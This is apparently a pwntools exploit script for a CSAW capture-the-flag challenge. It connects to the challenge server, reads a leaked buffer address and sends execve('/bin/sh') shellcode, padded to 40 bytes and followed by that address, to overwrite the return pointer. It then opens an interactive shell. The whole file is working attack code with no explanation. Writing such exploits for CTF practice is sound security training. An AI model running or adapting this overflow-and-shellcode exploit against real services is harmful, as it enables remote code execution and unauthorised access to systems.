#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('pwn.chal.csaw.io', 8464)

context.arch = 'amd64'

shellcode = asm("""
    mov rax, 59
    mov r8, 0x0068732f6e69622f
    push r8
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
""")

r.recvuntil('[*]Location:')
buf = int(r.recvline(), 16)
log.success('buf: ' + hex(buf))

r.sendafter('[*]Command:', shellcode.ljust(40, 'A') + p64(buf))

r.interactive()
